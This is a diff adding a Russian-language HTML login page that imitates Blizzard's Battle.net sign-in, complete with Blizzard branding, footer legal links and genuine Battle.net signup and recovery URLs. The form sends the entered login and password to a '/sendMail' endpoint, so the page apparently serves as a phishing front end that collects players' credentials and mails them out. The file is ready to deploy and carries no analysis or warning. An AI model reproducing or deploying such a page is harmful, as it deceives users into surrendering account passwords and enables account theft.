@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8"> 
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@24,400,0,0" />
+        <link rel="stylesheet" href="styles/all.css">
+        <link rel="icon" href="images/favicon.png">
+        <title>Авторизация</title>
+    </head>
+
+    <body>
+        <div class="content-box">
+            <h1 class="logo"></h1>
+            <div class="input">
+                <h3 class="login-header">Авторизоваться</h3>
+
+                <div class="web-services">  
+                    <a class="web-icons-holder white-bg" title="Авторизоваться с помощью Google"> <img class="icons" src="images/google-logo.svg"> </a>
+                    <a class="web-icons-holder facebook-icon" title="Авторизоваться с помощью Facebook"> <img class="icons" src="images/facebook-logo.svg"> </a>
+                    <a class="web-icons-holder white-bg" title="Авторизоваться с помощью Apple"> <img class="icons" src="images/apple-logo.svg"> </a>
+                </div>
+
+                <div class="web-services">
+                    <a class="web-icons-holder xbox-icon" title="Авторизоваться с помощью X-Box"> <img class="icons" src="images/xbox-logo.svg"> </a>
+                    <a class="web-icons-holder playstation-icon" title="Авторизоваться с помощью PlayStation"> <img class="icons" src="images/playstation-logo.svg"> </a>
+                    <a class="web-icons-holder switch-icon" title="Авторизоваться с помощью Switch"> <img class="icons" src="images/switch-logo.svg"> </a>
+                    <a class="web-icons-holder white-bg" title="Авторизоваться с помощью Steam"> <img class="icons" src="images/steam-logo.svg"> </a>
+                </div>
+
+                <div class="other-option-label">
+                    <span>или войти через</span>
+                </div>
+                <form method="post" action="/sendMail" >
+                    <div class="login-area">
+                        <div class="email-input" title="Электронная почта или телефон"><input type="text" placeholder="Электронная почта или телефон" name="login"></div>
+                        <div class="password-input" title="Пароль">
+                            <input type="text" placeholder="Пароль" name="password">
+                            <span><img width="16px" height="18px" src="images/visible.png"></span>
+                        </div>
+                    </div>
+                    <div class="submit-button-area"> 
+                        <button class="submit-button" type="submit" aria-label="Авторизоваться"> Авторизоваться </button>
+                    </div> 
+                </form>
+
+                <ul class="help-links" role="navigation">
+                    <li>
+                    <a href="https://account.battle.net/creation/?ref=https%3A%2F%2Feu.shop.battle.net%2Fru-ru&amp;theme=bnet-next&amp;app=shop&amp;hostingApp=shop&amp;flowTrackingId=c3311d7d-bdec-48f4-ab37-4b0cfff52b5a&amp;bdp=c805c763fb30cd9909b1ff92e5c9a6c8ffc723435c0e9a337f940f8cc834d242" tabindex="0" id="signup" role="button">
+                    Зарегистрируйте учетную запись Battle.net бесплатно
+                    </a>
+                    </li>
+                    <li>
+                    <a class="cant-login" href="https://account.battle.net/recovery/?ref=&amp;theme=bnet-next&amp;app=shop&amp;hostingApp=shop&amp;flowTrackingId=c3311d7d-bdec-48f4-ab37-4b0cfff52b5a" tabindex="0" id="loginSupport" role="button">
+                    Вы не можете войти? <img src="images/123.png">
+                    </a>
+                    </li>
+                    </ul>
+            </div>
+        </div>
+
+        <footer>
+            <div class="footer-nav">
+                <div class="footer-links">
+                    <a href="https://www.blizzard.com/company/legal/eula">Пользовательское соглашение Blizzard</a>
+                    <span>|</span>
+                    <a href="https://www.blizzard.com/company/about/privacy.html">Политика конфиденциальности</a>
+                    <span>|</span>
+                    <a href="https://www.blizzard.com/company/legal/">Условия</a>
+                    <span>|</span>
+                    <a href="https://eu.blizzard.com/company/about/infringementnotice.html">Авторское право</a>
+                    <span>|</span>
+                    <a href="/login/cookies">Файлы cookie</a>
+                    <span>|</span>
+                    <a href="/login/cookies#settings">Параметры cookie</a>
+                    <div class="copyright">© Blizzard Entertainment, Inc., 2023</div>
+                </div>
+            </div>
+        </footer>
+    </body>
+</html>
